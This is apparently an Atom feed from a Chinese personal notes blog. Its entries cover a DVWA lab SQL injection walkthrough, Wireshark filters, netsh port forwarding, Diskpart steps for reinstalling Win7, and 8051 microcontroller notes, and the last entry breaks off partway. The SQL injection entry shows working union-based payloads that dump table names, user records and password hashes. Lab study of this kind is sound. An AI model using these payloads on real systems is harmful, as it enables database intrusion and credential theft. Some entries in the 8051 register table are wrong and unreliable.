<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-12-20T23:25:06+08:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">悠悠然</title><subtitle>个人笔记</subtitle><author><name>jsf</name></author><entry><title type="html">基础SQL注入</title><link href="http://localhost:4000/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5/" rel="alternate" type="text/html" title="基础SQL注入" /><published>2018-12-20T00:00:00+08:00</published><updated>2018-12-20T00:00:00+08:00</updated><id>http://localhost:4000/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5</id><content type="html" xml:base="http://localhost:4000/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5/">&lt;div id=&quot;outline-container-sec-1&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;sec-1&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 手工sql注入&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;p&gt;
sql注入，就是用户通过浏览器提交的变量内容，后台应用程序对浏览器提交的内容并未进行检查过滤，
直接拼接sql语句后去查询数据库，导致将数据库中的其它信息返回至用户界面中，造成数据库中其它未对用户授权的数据泄漏。
&lt;/p&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-sec-1-1&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;sec-1-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; DVWA Sql注入学习&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;p&gt;
测试sql语句
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
&quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-1-1-1&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;sec-1-1-1&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.1&lt;/span&gt; 返回内容正常&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
ID: 1
First name: admin
Surname: admin
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-1-1-2&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;sec-1-1-2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.2&lt;/span&gt; 返回查询所有记录&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
ID: 1' or '1'='1
First name: admin
Surname: admin
ID: 1' or '1'='1
First name: Gordon
Surname: Brown
ID: 1' or '1'='1
First name: Hack
Surname: Me
ID: 1' or '1'='1
First name: Pablo
Surname: Picasso
ID: 1' or '1'='1
First name: Bob
Surname: Smith
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-1-1-3&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;sec-1-1-3&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.3&lt;/span&gt; 判断有多少个字段，修改order by 后面的字段值，直到数据库报错&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
ID: 1' or 1=1 order by 2 #
First name: admin
Surname: admin
ID: 1' or 1=1 order by 2 #
First name: Gordon
Surname: Brown
ID: 1' or 1=1 order by 2 #
First name: Hack
Surname: Me
ID: 1' or 1=1 order by 2 #
First name: Pablo
Surname: Picasso
ID: 1' or 1=1 order by 2 #
First name: Bob
Surname: Smith
执行结果说明，sql查询语句中只有两个字段
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-1-1-4&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;sec-1-1-4&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.4&lt;/span&gt; 确定显示的字段顺序&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-4&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
ID: 1' union select 1,2 #
First name: admin
Surname: admin
ID: 1' union select 1,2 #
First name: 1
Surname: 2
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-1-1-5&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;sec-1-1-5&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.5&lt;/span&gt; 获取当前数据库及版本&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-5&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
ID: 1' union select version(),database() #
First name: admin
Surname: admin
ID: 1' union select version(),database() #
First name: 10.1.26-MariaDB-0+deb9u1
Surname: dvwa
从返回结果中我们可以看出数据库的名称和版本号
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-1-1-6&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;sec-1-1-6&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.6&lt;/span&gt; 获取数据库中的表&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-6&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
ID: 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
First name: admin
Surname: admin
ID: 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
First name: 1
Surname: guestbook,users
返回结果说明，数据库中存在了两张表为: guestbook,user
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-1-1-7&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;sec-1-1-7&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.7&lt;/span&gt; 获取表字段名称&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-7&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; #
First name: admin
Surname: admin
ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; #
First name: 1
Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-1-1-8&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;sec-1-1-8&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.8&lt;/span&gt; 获取表中数据&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-8&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
ID: 1' union select group_concat(first_name),group_concat(password) from users #
First name: admin
Surname: admin
ID: 1' union select group_concat(first_name),group_concat(password) from users #
First name: admin,Gordon,Hack,Pablo,Bob
Surname: 5f4dcc3b5aa765d61d8327deb882cf99,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99


ID: 1' union select last_name,password from users #
First name: admin
Surname: admin
ID: 1' union select last_name,password from users #
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
ID: 1' union select last_name,password from users #
First name: Brown
Surname: e99a18c428cb38d5f260853678922e03
ID: 1' union select last_name,password from users #
First name: Me
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
ID: 1' union select last_name,password from users #
First name: Picasso
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
ID: 1' union select last_name,password from users #
First name: Smith
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
&lt;/pre&gt;

&lt;!-- more-forword --&gt;


&lt;!-- more --&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>jsf</name></author><category term="sql" /></entry><entry><title type="html">WireShark过滤规则</title><link href="http://localhost:4000/network/2018/12/19/wireshark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/" rel="alternate" type="text/html" title="WireShark过滤规则" /><published>2018-12-19T00:00:00+08:00</published><updated>2018-12-19T00:00:00+08:00</updated><id>http://localhost:4000/network/2018/12/19/wireshark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99</id><content type="html" xml:base="http://localhost:4000/network/2018/12/19/wireshark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/">&lt;div id=&quot;outline-container-sec-1&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;sec-1&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; WireShark过滤规则&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;&lt;div id=&quot;outline-container-sec-1-1&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;sec-1-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 过滤IP&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
ip.dst == 1.1.1.1
ip.src eq 192.168.120.184
ip.addr eq 192.168.120.184
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-sec-1-2&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;sec-1-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 过滤MAC地址&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
eth.src == af:4f:3d:7f:2d:23
eth.dst eq 56:8d:2a:3e:2c:03
eth.addr eq 2e:0a:87:02:34:64
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-sec-1-3&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;sec-1-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.3&lt;/span&gt; 过滤端口&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
tcp.port eq 22
tcp.dstport == 80
tcp.srcport eq 23
udp.port eq 3389
tcp.port &amp;gt;= 1 and tcp.port &amp;lt;= 1024
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-sec-1-4&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;sec-1-4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.4&lt;/span&gt; http模式过滤&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-4&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
http.host == &quot;www.myhost.com&quot;
http.request.method == &quot;GET&quot;
http.request.method == &quot;POST&quot;
http contains &quot;test&quot;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-sec-1-5&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;sec-1-5&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.5&lt;/span&gt; 包长度过滤&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-5&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
udp.length eq 26
tcp.len eq 94
frame.len == 119
&lt;/pre&gt;


&lt;!-- more-forword --&gt;


&lt;!-- more --&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>jsf</name></author></entry><entry><title type="html">Windows端口转发</title><link href="http://localhost:4000/windows/2018/12/10/windows%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" rel="alternate" type="text/html" title="Windows端口转发" /><published>2018-12-10T00:00:00+08:00</published><updated>2018-12-10T00:00:00+08:00</updated><id>http://localhost:4000/windows/2018/12/10/windows%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91</id><content type="html" xml:base="http://localhost:4000/windows/2018/12/10/windows%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">&lt;div id=&quot;outline-container-sec-1&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;sec-1&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 使用端口转发&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;p&gt;
在Windows操作系统中有时候需要更改初始服务端口才能够访问时（防火墙阻断正常端口访问），更改软件端口又比较麻烦时，可以使用Windows操作系统自带的端口转发软件，或者其它情况下需要做端口转发时则可以使用一下此方法实现。
&lt;/p&gt;

&lt;p&gt;
添加:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
netsh interface portproxy add v4tov4 listenport=转发端口 listenaddress=本机IP connectport=目标端口 connectaddress=目标IP
&lt;/pre&gt;

&lt;p&gt;
删除:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
netsh interface portproxy delete v4tov4 listenport=转发端口 listenaddress=本机IP
&lt;/pre&gt;


&lt;!-- more-forword --&gt;


&lt;!-- more --&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>jsf</name></author><category term="Dos" /></entry><entry><title type="html">由Win10操作系统更换至Win7操作系统</title><link href="http://localhost:4000/windows/2018/12/10/%E7%94%B1win10%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%8D%A2%E8%87%B3win7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="alternate" type="text/html" title="由Win10操作系统更换至Win7操作系统" /><published>2018-12-10T00:00:00+08:00</published><updated>2018-12-10T00:00:00+08:00</updated><id>http://localhost:4000/windows/2018/12/10/%E7%94%B1win10%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%8D%A2%E8%87%B3win7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F</id><content type="html" xml:base="http://localhost:4000/windows/2018/12/10/%E7%94%B1win10%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%8D%A2%E8%87%B3win7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">&lt;div id=&quot;outline-container-sec-1&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;sec-1&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 更改系统&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;&lt;div id=&quot;outline-container-sec-1-1&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;sec-1-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 安装系统准备&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;p&gt;
在安装Win7系统之前，需要备份Win10操作系统所在磁盘中的所有用户数据，系统重新安装之后原有数据都将丢失。首先需要准备备好一个安装U盘或者安装光盘，并提前准备好硬盘、USB及网卡等必要的驱动程序，在安装过程或安装后可能会使用到。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-1-2&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;sec-1-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 安装Win7系统&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;p&gt;
一切准备工作做好后，就可以进行Win7系统的安装了，更改默认的启动方式，选择U盘或者光驱进入
Win7安装界面。
&lt;/p&gt;

&lt;p&gt;
然后按照如下的操作方法进行磁盘格式的更改，成功之后就可以顺利的进行Win7系统的安装了):
&lt;/p&gt;

&lt;pre class=&quot;example&quot;&gt;
shift + F10
Diskpart
list disk  //列出当前计算机上的所有物理磁盘
select disk 1  //磁盘编号从0开始，这里选择了第二块磁盘
clean  //清除物理磁盘所有信息
convert mbr  //更改格式
exit
exit
&lt;/pre&gt;

&lt;p&gt;
当做完上述操作之后就可以进行磁盘的分区，及系统的安装，如果找不到磁盘可以尝试加载磁盘驱动程序，后续的安装比较简单可以按照提示做即可。
&lt;/p&gt;


&lt;!-- more-forword --&gt;


&lt;!-- more --&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>jsf</name></author><category term="Dos" /></entry><entry><title type="html">51单片机</title><link href="http://localhost:4000/%E5%8D%95%E7%89%87%E6%9C%BA/2018/12/05/51%E5%8D%95%E7%89%87%E6%9C%BA/" rel="alternate" type="text/html" title="51单片机" /><published>2018-12-05T00:00:00+08:00</published><updated>2018-12-05T00:00:00+08:00</updated><id>http://localhost:4000/%E5%8D%95%E7%89%87%E6%9C%BA/2018/12/05/51%E5%8D%95%E7%89%87%E6%9C%BA</id><content type="html" xml:base="http://localhost:4000/%E5%8D%95%E7%89%87%E6%9C%BA/2018/12/05/51%E5%8D%95%E7%89%87%E6%9C%BA/">&lt;div id=&quot;outline-container-sec-1&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;sec-1&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 单片机结构&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;p&gt;
一台计算机由一下几部分组成：CPU、RAM、ROM、I/O设备。在个人计算机这些部分在集成在多个芯片上，
而在单片机中这些都被集成到一块芯片中，单片机是一种控制芯片，一个微型的计算机。
&lt;/p&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-1-1&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;sec-1-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 单片机引脚&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;p&gt;
单片机的40个引脚大致可以分为4类：电源、时钟、控制、I/O引脚。
&lt;/p&gt;

&lt;p&gt;
1、电源
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
VCC 芯片电源 +5V
VSS 接地端
&lt;/pre&gt;
&lt;p&gt;
2、时钟
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
XTAL1、XTAL2 晶体振荡电路反向输入端和输出端
&lt;/pre&gt;
&lt;p&gt;
3、控制线：控制线共有四根
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
a、ALE/PROG:地址锁存允许/片内EPROM编程脉冲
AEL功能：用来锁存P0口送出的低8位地址
PROG功能：片内有EPROM的芯片，在EPROM编程期间，此引脚输入编程脉冲

b、PSEN：外ROM读选通信号

c、RST/VPD：复位/备用电源
RST功能：复位信号输入端
VPD功能：在VCC掉电情况下，使用备用电源

d、EA/Vpp：内部ROM选择/片内EPROM编程电源
EA功能：内外ROM选择端
Vpp功能：片内有EPROM芯片，在EPROM编程期间，施加编程电源Vpp
&lt;/pre&gt;

&lt;p&gt;
4、I/O线
&lt;/p&gt;

&lt;p&gt;
80C51共有4个8位并行I/O端口：P0、P1、P2、P3口，共有32个引脚，P3还具有第二功能，用于特殊信号输入输出和控制信号（输入控制总线）。
&lt;/p&gt;

&lt;!-- more-forword --&gt;


&lt;!-- more --&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-1-2&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;sec-1-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 特殊功能寄存器&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;p&gt;
在单片机中有一些独立的存储单元用来控制定时器/计数器，串行I/O口等器件，被称为特殊功能寄存器
（SFR）。特殊功能寄存器如下表：
&lt;/p&gt;
&lt;table&gt;


&lt;colgroup&gt;
&lt;col  class=&quot;left&quot;&gt;

&lt;col  class=&quot;left&quot;&gt;

&lt;col  class=&quot;left&quot;&gt;
&lt;/colgroup&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;符号&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;地址&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;功能&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;B&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;F0H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;B寄存器&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;ACC&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;E0H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;累加器&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;PSW&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;D0H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;程序状态字&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;IP&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;B8H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;中断优先级控制寄存器&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;P3&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;B0H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;P3口锁存器&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;IE&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;A8H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;中断允许控制寄存器&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;P2&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;A0H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;P2口锁存器&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;SBUF&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;99H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;串行口锁存器&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;SCON&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;98H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;串行口控制寄存器&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;P1&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;90H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;P1口锁存器&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;TH1&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;8DH&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;定时器/计数器1（高8位）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;TH0&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;8CH&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;定时器/计数器1（低8位）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;TL1&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;8BH&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;定时器/计数器0（高8位）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;TL0&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;8AH&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;定时器/计数器0（低8位）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;TMOD&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;89A&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;定时器/计数器方式控制寄存器&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;TCON&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;88H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;定时器/计数器控制寄存器&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;DPH&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;83H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;数据地址指针（高8位）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;DPL&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;82H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;数据地址指针（低8位）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;SP&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;81H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;堆栈指针&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;P0&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;80H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;P0口锁存器&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;left&quot;&gt;PCON&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;87H&lt;/td&gt;
&lt;td class=&quot;left&quot;&gt;电源控制寄存器&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-2&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;sec-2&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 单片机寻址方式与指令系统&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;&lt;div id=&quot;outline-container-sec-2-1&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;sec-2-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; 指令格式&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;p&gt;
在MCS-51指令中，一般指令主要由操作码、操作数组成。指令应该有如下功能：
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
1、操作码指明执行什么性质和类型的操作
2、操作数指明操作的数本身或者是操作数所在的地址
3、指定操作结果存放的地址
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-sec-2-2&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;sec-2-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; 寻址方式&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;p&gt;
1、立即寻址
&lt;/p&gt;

&lt;p&gt;
操作数以指令形式出现，称作立即数，用#号的8位或者16位数来表示。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
MOV A, #60H    ;A &amp;lt;- #60H
MOV 30H, #40   ;30H单元 &amp;lt;- #40H
&lt;/pre&gt;
&lt;p&gt;
以上命令执行完成之后，累加器A中数据为立即数据60H，30H单元中数据为立即数40H。
&lt;/p&gt;

&lt;p&gt;
2、直接寻址
&lt;/p&gt;

&lt;p&gt;
指令中直接给出操作数的8位地址，能进行直接寻址的存储空间有SFR和片内RAM。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
MOV PSW, #20H
PSW直接地址为D0H，在指令中可使用其名称
MOV A, 30H
30为直接给出的内部RAM地址。
&lt;/pre&gt;

&lt;p&gt;
3、寄存器寻址
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
INC DPTR    ;DPTR &amp;lt;- DPTR+1
ADD A, R2   ;A &amp;lt;- A+R2
&lt;/pre&gt;

&lt;p&gt;
4、寄存器间接寻址
&lt;/p&gt;

&lt;p&gt;
以寄存器的内容为操作数的地址，在寄存器前加@用来区分。即以寄存器作为指针，可用来访问片内RAM
和片外RAM，不能访问SFR。能作为间接寻址的寄存器有R0、R1、DPTR、SP，其中R0、R1是指所选中的工作寄存器，SP仅用于堆栈操作。
&lt;/p&gt;
